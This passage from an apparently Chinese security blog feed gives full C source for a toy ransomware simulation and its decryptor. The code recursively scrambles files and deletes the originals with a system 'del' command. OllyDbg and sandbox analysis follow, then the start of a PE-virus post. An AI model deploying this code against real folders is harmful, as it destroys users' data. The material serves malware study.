class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;打开 %s 文件成功!\n&quot;</span>, fileName);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取文件大小</span></span><br><span class="line">fseek(fp, <span class="number">0</span>, SEEK_END);                   <span class="comment">//设置光标到文件末尾</span></span><br><span class="line">size = ftell(fp);                         <span class="comment">//计算光标位置距离文件头字节数</span></span><br><span class="line">fseek(fp, <span class="number">0</span>, SEEK_SET);                   <span class="comment">//设置光标位置到文件头</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;文件大小为：%d字节！\n&quot;</span>, size);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取文件所有内容</span></span><br><span class="line">    <span class="comment">//在当前目录下构造一个pathName+test路径</span></span><br><span class="line"><span class="type">char</span> code = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="type">char</span> ch;</span><br><span class="line"><span class="type">char</span> temp[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(temp, <span class="string">&quot;%s\\%s&quot;</span>, pathName, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, temp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建pathName+test文件</span></span><br><span class="line">FILE* fpw = fopen(temp, <span class="string">&quot;wb&quot;</span>);         <span class="comment">//写入文件</span></span><br><span class="line"><span class="keyword">while</span> (!feof(fp)) &#123; </span><br><span class="line">ch = fgetc(fp);</span><br><span class="line">fputc(ch, fpw);</span><br><span class="line">fputc(code, fpw);</span><br><span class="line"><span class="comment">//printf(&quot;%c\n&quot;, ch);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//保存关闭</span></span><br><span class="line">fclose(fp);</span><br><span class="line">fclose(fpw);</span><br><span class="line"></span><br><span class="line"><span class="comment">//替换文件</span></span><br><span class="line"><span class="type">char</span> commend[<span class="number">1024</span>];</span><br><span class="line"><span class="built_in">memset</span>(commend, <span class="number">0</span>, <span class="number">1024</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(commend, <span class="string">&quot;del \&quot;%s\&quot;&quot;</span>, fileName);     <span class="comment">//访问路径包含空格增加双引号</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, commend);</span><br><span class="line">system(commend);<span class="comment">//执行删除命令</span></span><br><span class="line">rename(temp, fileName);                       <span class="comment">//调用C语言rename函数重命名文件</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历文件夹找到每个文件 参数-文件夹名字</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">findFile</span><span class="params">(<span class="type">char</span>* pathName)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* 禁止加密他人计算机,一定只能对指定目录加密,尤其不能对C盘加密 */</span></span><br><span class="line"><span class="comment">//1.设置要找的文件名 通配符实现</span></span><br><span class="line"><span class="type">char</span> findFileName[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">memset</span>(findFileName, <span class="number">0</span>, <span class="number">256</span>);                   <span class="comment">//清空数组</span></span><br><span class="line"><span class="built_in">sprintf</span>(findFileName, <span class="string">&quot;%s\\*.*&quot;</span>, pathName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;要找的文件名是：%s\n&quot;</span>, findFileName);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.获取目录下第一个文件</span></span><br><span class="line">WIN32_FIND_DATA findData;                    <span class="comment">//定义结构体</span></span><br><span class="line">HANDLE hFile = FindFirstFile(findFileName, &amp;findData);</span><br><span class="line"><span class="comment">//判断返回值等于-1(INVALID_HANDLE_VALUE)</span></span><br><span class="line"><span class="keyword">if</span> (INVALID_HANDLE_VALUE == hFile) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;查找文件失败!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//如果成功进入死循环继续查找下一个文件</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">int</span> ret = <span class="number">1</span>;</span><br><span class="line"><span class="type">char</span> temp[<span class="number">256</span>];</span><br><span class="line"><span class="keyword">while</span> (ret) &#123;</span><br><span class="line"><span class="comment">//如果找到的是个文件夹 则需要继续查找该文件夹内容</span></span><br><span class="line"><span class="keyword">if</span> (findData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) &#123;</span><br><span class="line"><span class="keyword">if</span>(findData.cFileName[<span class="number">0</span>] != <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line"><span class="comment">//文件夹拼接=原始路径+新文件夹路径</span></span><br><span class="line"><span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(temp, <span class="string">&quot;%s\\%s&quot;</span>, pathName, findData.cFileName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找到一个文件夹：%s\n&quot;</span>, temp);</span><br><span class="line">Sleep(<span class="number">1000</span>);                             <span class="comment">//暂停1秒钟</span></span><br><span class="line">findFile(temp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="comment">//如果是文件 则加密文件</span></span><br><span class="line"><span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(temp, <span class="string">&quot;%s\\%s&quot;</span>, pathName, findData.cFileName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找到一个文件：%s\n&quot;</span>, temp);</span><br><span class="line"><span class="comment">//加密文件</span></span><br><span class="line">jiami(temp, pathName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查找下一个文件</span></span><br><span class="line">ret = FindNextFile(hFile, &amp;findData);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> buff[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">GetCurrentDirectory(<span class="number">256</span>, buff);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;当前目录是：%s\n\n&quot;</span>, buff);</span><br><span class="line"><span class="comment">//加密指定文件夹目录 建议使用虚拟机执行</span></span><br><span class="line">findFile(<span class="string">&quot;C:\\Users\\v5le0n9\\Desktop\\l30n9ry0n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/5ec21076/1.1.8.png" class=""><p>可以看到修改日期是今天，创建日期也是今天，因为原本的文件都被删除了。并且文件都加了密，文件文件乱码、图片不能显示、EXE也不能执行。</p><img src="/posts/5ec21076/1.1.9.png" class=""><p>6.编写解密功能。</p><p>当我们中了勒索病毒，就需要解密。在真实环境中，MD5、hash、SHA-1都是比较常用的加密算法。编写解密功能有两种方法：</p><ul><li>全部读入内存，修改后重新存入文件</li><li>边读边写到另一新建文件，要修改的部分修改后存入新建文件，其它部分原封不动写入，写完删除加密文件，并将这个新文件改为加密文件的名字</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//文件加密函数 参数-文件名字</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">jiami</span><span class="params">(<span class="type">char</span>* fileName, <span class="type">char</span>* pathName)</span></span><br><span class="line">&#123;</span><br><span class="line">FILE* fp = <span class="literal">NULL</span>;                  <span class="comment">//文件指针变量</span></span><br><span class="line"><span class="type">int</span> size = <span class="number">0</span>;                     <span class="comment">//文件大小</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//打开文件</span></span><br><span class="line"><span class="comment">//注意： 使用二进制打开可以复制大型文件如.exe文件，音频视频文件等</span></span><br><span class="line">fp = fopen(fileName, <span class="string">&quot;rb&quot;</span>);       <span class="comment">//打开可读写的文件</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == fp) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;打开文件失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;打开 %s 文件成功!\n&quot;</span>, fileName);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取文件大小</span></span><br><span class="line">fseek(fp, <span class="number">0</span>, SEEK_END);                   <span class="comment">//设置光标到文件末尾</span></span><br><span class="line">size = ftell(fp);                         <span class="comment">//计算光标位置距离文件头字节数</span></span><br><span class="line">fseek(fp, <span class="number">0</span>, SEEK_SET);                   <span class="comment">//设置光标位置到文件头</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;文件大小为：%d字节！\n&quot;</span>, size);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取文件所有内容</span></span><br><span class="line"><span class="type">char</span> code = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="type">char</span> ch;</span><br><span class="line"><span class="type">char</span> temp[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(temp, <span class="string">&quot;%s\\%s&quot;</span>, pathName, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, temp);</span><br><span class="line"></span><br><span class="line">FILE* fpw = fopen(temp, <span class="string">&quot;wb&quot;</span>);         <span class="comment">//写入文件</span></span><br><span class="line"><span class="keyword">while</span> (!feof(fp)) &#123; </span><br><span class="line">ch = fgetc(fp);</span><br><span class="line">fputc(ch, fpw);</span><br><span class="line">fputc(code, fpw);</span><br><span class="line"><span class="comment">//printf(&quot;%c\n&quot;, ch);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//保存关闭</span></span><br><span class="line">fclose(fp);</span><br><span class="line">fclose(fpw);</span><br><span class="line"></span><br><span class="line"><span class="comment">//替换文件</span></span><br><span class="line"><span class="type">char</span> commend[<span class="number">1024</span>];</span><br><span class="line"><span class="built_in">memset</span>(commend, <span class="number">0</span>, <span class="number">1024</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(commend, <span class="string">&quot;del \&quot;%s\&quot;&quot;</span>, fileName);     <span class="comment">//访问路径包含空格增加双引号</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, commend);</span><br><span class="line">system(commend);</span><br><span class="line">rename(temp, fileName);                       <span class="comment">//调用C语言rename函数重命名文件</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//文件解密函数 参数-文件名字</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">jiemi</span><span class="params">(<span class="type">char</span>* fileName, <span class="type">char</span>* pathName)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> ch;</span><br><span class="line"><span class="type">int</span> size = <span class="number">0</span>;                        <span class="comment">//文件大小</span></span><br><span class="line">FILE* fp;                           <span class="comment">//打开文件</span></span><br><span class="line">FILE* fpw;                           <span class="comment">//写入文件</span></span><br><span class="line"><span class="type">char</span> tmp[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化操作</span></span><br><span class="line"><span class="built_in">memset</span>(tmp, <span class="number">0</span>, <span class="number">1024</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(tmp, <span class="string">&quot;%s\\tmp&quot;</span>, pathName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, tmp);</span><br><span class="line">fp = fopen(fileName, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">fpw = fopen(tmp, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">fseek(fpw, <span class="number">0</span>, SEEK_SET);             <span class="comment">//设置光标位置到文件头</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//每隔一个字节删除一个字节数据</span></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (!feof(fp)) &#123;</span><br><span class="line">ch = fgetc(fp);</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == (i % <span class="number">2</span>)) &#123; <span class="comment">//偶数写入</span></span><br><span class="line">i = <span class="number">1</span>;</span><br><span class="line">fputc(ch, fpw);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fclose(fp);</span><br><span class="line">fclose(fpw);</span><br><span class="line"></span><br><span class="line"><span class="comment">//替换文件</span></span><br><span class="line"><span class="type">char</span> commend[<span class="number">1024</span>];</span><br><span class="line"><span class="built_in">memset</span>(commend, <span class="number">0</span>, <span class="number">1024</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(commend, <span class="string">&quot;del \&quot;%s\&quot;&quot;</span>, fileName);     <span class="comment">//访问路径包含空格增加双引号</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, commend);</span><br><span class="line">system(commend);</span><br><span class="line">rename(tmp, fileName);                       <span class="comment">//调用C语言rename函数重命名文件</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历文件夹找到每个文件 参数-文件夹名字</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">findFile</span><span class="params">(<span class="type">char</span>* pathName)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* 禁止加密他人计算机,一定只能对指定目录加密,尤其不能对C盘加密 */</span></span><br><span class="line"><span class="comment">//1.设置要找的文件名 通配符实现</span></span><br><span class="line"><span class="type">char</span> findFileName[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">memset</span>(findFileName, <span class="number">0</span>, <span class="number">256</span>);                   <span class="comment">//清空数组</span></span><br><span class="line"><span class="built_in">sprintf</span>(findFileName, <span class="string">&quot;%s\\*.*&quot;</span>, pathName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;要找的文件名是：%s\n&quot;</span>, findFileName);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.获取目录下第一个文件</span></span><br><span class="line">WIN32_FIND_DATA findData;                    <span class="comment">//定义结构体</span></span><br><span class="line">HANDLE hFile = FindFirstFile(findFileName, &amp;findData);</span><br><span class="line"><span class="comment">//判断返回值等于-1(INVALID_HANDLE_VALUE)</span></span><br><span class="line"><span class="keyword">if</span> (INVALID_HANDLE_VALUE == hFile) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;查找文件失败!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//如果成功进入死循环继续查找下一个文件</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">int</span> ret = <span class="number">1</span>;</span><br><span class="line"><span class="type">char</span> temp[<span class="number">256</span>];</span><br><span class="line"><span class="keyword">while</span> (ret) &#123;</span><br><span class="line"><span class="comment">//如果找到的是个文件夹 则需要继续查找该文件夹内容</span></span><br><span class="line"><span class="keyword">if</span> (findData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) &#123;</span><br><span class="line"><span class="keyword">if</span>(findData.cFileName[<span class="number">0</span>] != <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line"><span class="comment">//文件夹拼接=原始路径+新文件夹路径</span></span><br><span class="line"><span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(temp, <span class="string">&quot;%s\\%s&quot;</span>, pathName, findData.cFileName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找到一个文件夹：%s\n&quot;</span>, temp);</span><br><span class="line">Sleep(<span class="number">1000</span>);                             <span class="comment">//暂停1秒钟</span></span><br><span class="line">findFile(temp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="comment">//如果是文件 则加密或解密文件</span></span><br><span class="line"><span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(temp, <span class="string">&quot;%s\\%s&quot;</span>, pathName, findData.cFileName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找到一个文件：%s\n&quot;</span>, temp);</span><br><span class="line"><span class="comment">//加密文件</span></span><br><span class="line"><span class="comment">//jiami(temp, pathName);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//解密文件</span></span><br><span class="line">jiemi(temp, pathName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查找下一个文件</span></span><br><span class="line">ret = FindNextFile(hFile, &amp;findData);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> buff[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">GetCurrentDirectory(<span class="number">256</span>, buff);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;当前目录是：%s\n\n&quot;</span>, buff);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//加解密指定文件夹目录 建议使用虚拟机执行</span></span><br><span class="line">findFile(<span class="string">&quot;C:\\Users\\v5le0n9\\Desktop\\l30n9ry0n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终结果如下：</p><img src="/posts/5ec21076/1.2.1.png" class=""><p>除了文本文件其它文件都复原了，这是为什么😓但是复原的文件都比最初始的文件多了2个字节，救命我也不知道为什么，可能是字符<code>\0</code>之类的？</p><h1 id="2-OD逆向分析加密PE文件"><a href="#2-OD逆向分析加密PE文件" class="headerlink" title="2. OD逆向分析加密PE文件"></a>2. OD逆向分析加密PE文件</h1><p>将上面编写的代码编译成EXE文件，我是拿去32位Win 7系统上编译的，这样编译出来的EXE也是32位，才能加载进OD分析。</p><img src="/posts/5ec21076/2.1.1.png" class=""><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc main.c -o main</span><br></pre></td></tr></table></figure><p>载入OD后，右键 -&gt; 查找 -&gt; 当前模块中的名称，查看该EXE调用到了哪些API函数。</p><img src="/posts/5ec21076/2.1.2.png" class=""><p>选中<code>FindFirstFileA()</code>右键 -&gt; 在每个参考上设置断点，如果在断点窗口没有看到断点，也就是断点没下成功，那就用另一种方法：在CPU窗口右键 -&gt; 查找 -&gt; 所有模块间的调用，找到<code>FindFirstFileA()</code>右键 -&gt; 在每个调用到 FindFirstFileA 上设置断点，找到两处。在断点窗口中选中某一个断点右键 -&gt; 反汇编窗口中跟随，可以查看这条指令上下有什么特别的指令。</p><p>运行，第一次断下显示：</p><img src="/posts/5ec21076/2.1.3.png" class=""><p>第二次断下显示：</p><img src="/posts/5ec21076/2.1.4.png" class=""><p>继续F7调试发现可以看到参数传递、字符串拼接、睡眠函数等内容，重点是我们要通过call分析进入到加密函数中，然后去分析加密函数里的算法从而实现逆向破解。</p><p>在逆向分析的过程中，需要思考几个问题：</p><ul><li>OD逆向怎么判断恶意样本执行或检测了哪些文件</li><li>OD逆向怎么判断恶意样本是否具有注册表操作、系统进程获取、屏幕截屏等操作</li><li>OD逆向怎么判断恶意样本的网络操作，IP地址、邮箱、域名访问请求情况</li><li>OD逆向怎么判断恶意样本是否具有蠕虫传播感染功能</li><li>怎么溯源一个恶意样本</li></ul><h1 id="3-在线沙箱分析"><a href="#3-在线沙箱分析" class="headerlink" title="3. 在线沙箱分析"></a>3. 在线沙箱分析</h1><p>在恶意样本逆向分析中，在线平台给我们提供了强大的支撑，我们拿到一个样本后可以先对其进行在线监测。其操作比较简单，就是将恶意样本上传至指定在线网址即可。常见的在线沙箱分析包括：</p><ul><li><a href="https://www.virustotal.com/">VirusTotal沙箱</a></li><li><a href="https://ti.qianxin.com/">360沙箱</a></li><li><a href="https://cuckoo.cert.ee/">Cuckoo沙箱</a></li><li><a href="https://s.threatbook.cn/">微步沙箱</a></li></ul><p>以VirusTotal沙箱为例，将我们的<code>main.exe</code>传上去，等待它检测。结果67家安全供应商中只有9家没有将这个文件标记为恶意文件。</p><img src="/posts/5ec21076/3.1.png" class=""><p>我们还可以看到样本的基本信息、文件历史信息以及PE文件节点信息。</p><img src="/posts/5ec21076/3.2.png" class=""><p>如果样本有恶意家族关联，它也能给出相应的信息。</p><img src="/posts/5ec21076/3.3.png" class="">]]></content>
    
    
    <summary type="html">&lt;p&gt;勒索病毒是一种新型电脑病毒，主要以邮件、程序木马、网页挂马的形式进行传播。这种病毒利用各种加密算法对文件进行加密，被感染者一般无法解密，必须拿到解密的私钥才有可能破解。&lt;/p&gt;
&lt;p&gt;现在就用C语言来实现一下系统文件加密及解密功能，简单模拟勒索病毒的加解密原理。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>Windows PE病毒分类及感染方式</title>
    <link href="http://example.com/posts/adc1352a.html"/>
    <id>http://example.com/posts/adc1352a.html</id>
    <published>2022-05-22T00:36:31.469Z</published>
    <updated>2022-05-23T04:43:09.761Z</updated>
    
    <content type="html"><![CDATA[<p>以后我们很长时间都要与Windows PE病毒打交道，所以在这里就先了解下它的分类及感染方式吧。</p><span id="more"></span><h1 id="1-PE病毒的概念"><a href="#1-PE病毒的概念" class="headerlink" title="1. PE病毒的概念"></a>1. PE病毒的概念</h1><p>PE病毒又称为Win32 PE病毒，或称为Win32病毒，它指所有Windows下PE文件格式文件的感染病毒。因为它通常采用Win32汇编编写，而且格式为PE文件，因此得名。</p><p>PE病毒是以Windows PE程序为载体，能寄生于PE文件或Windows系统的病毒程序。</p><p>感染是指在尽量不影响目标程序(系统)正常功能的前提下，而使其具有病毒自身的功能。一个病毒通常包括如下模块：</p><ul><li>感染模块：被感染程序同样具备感染能力</li><li>触发模块：在特定条件下实施相应的病毒功能，比如日期、键盘输入等</li><li>破坏模块：网络攻击行为，推荐攻击链或ATT&amp;CK</li><li>其他模块</li></ul><p>如果我们要编写或分析PE病毒，则需要掌握以下关键信息：</p><ul><li>病毒的重定位</li><li>获取API函数地址</li><li>文件搜索</li><li>内存映射文件</li><li>病毒如何感染其它文件</li><li>病毒如何返回到Host程序</li></ul><h1 id="2-PE病毒分类"><a href="#2-PE病毒分类" class="headerlink" title="2. PE病毒分类"></a>2. PE病毒分类</h1><p>以感染目标进行分类，包括文件感染和系统感染。</p><h2 id="2-1-文件感染"><a href="#2-1-文件感染" class="headerlink" title="2.1 文件感染"></a>2.1 文件感染</h2><p>将代码寄生在PE文件，病毒本身只是PE文件的一部分，依赖于感染目标，通常也叫Host文件，控制权获得也是以目标程序运行来获得的。分为：</p><ul><li>传统感染型：以Win32汇编程序编写为主</li><li>捆绑释放型：编写难度较低，通过高级语言均可编写，将目标程序和病毒程序捆在一起，和捆绑器有相似之处</li></ul><h2 id="2-2-系统感染"><a href="#2-2-系统感染" class="headerlink" title="2.2 系统感染"></a>2.2 系统感染</h2><p>将代码或程序寄生在Windows操作系统，该类病毒越来越多，它不感染具体文件，但是它会在操作系统中保存自己的实体，同时也可以通过系统启动的方法来获得控制权。传播途径包括即时通信软件、U盘、光盘、电子邮件、网络共享等。</p><h1 id="3-传统文件感染型"><a href="#3-传统文件感染型" class="headerlink" title="3. 传统文件感染型"></a>3. 传统文件感染型</h1><h2 id="3-1-感染思路"><a href="#3-1-感染思路" class="headerlink" title="3.1 感染思路"></a>3.1 感染思路</h2><p>如下图所示，左边是一个正常的PE文件，右边是PE病毒感染该程序时的修改，病毒代码以新节的形式附在程序最后面。我们知道PE文件是由多个节组成的，病毒代码为了融入目标程序会以节的形式，同时修改PE文件头。</p><img src="/posts/adc1352a/3.1.1.png" class="" title="传统文件感染"><p>对感染来说，它一方面需要使得宿主具备自己的功能，另一方面也不破坏宿主程序的功能。所以病毒代码执行完毕之后，它必须将控制权交还给宿主，以免自己被发现。</p><ul><li>优点：被感染后的程序主体依然是目标程序，不影响目标程序图标，隐蔽性稍好。</li><li>缺点：对病毒代码的编写要求较高，通常是汇编语言编写；难以成功感染自校验程序。</li></ul><h2 id="3-2-感染的基本流程"><a href="#3-2-感染的基本流程" class="headerlink" title="3.2 感染的基本流程"></a>3.2 感染的基本流程</h2><p>比如某个Windows 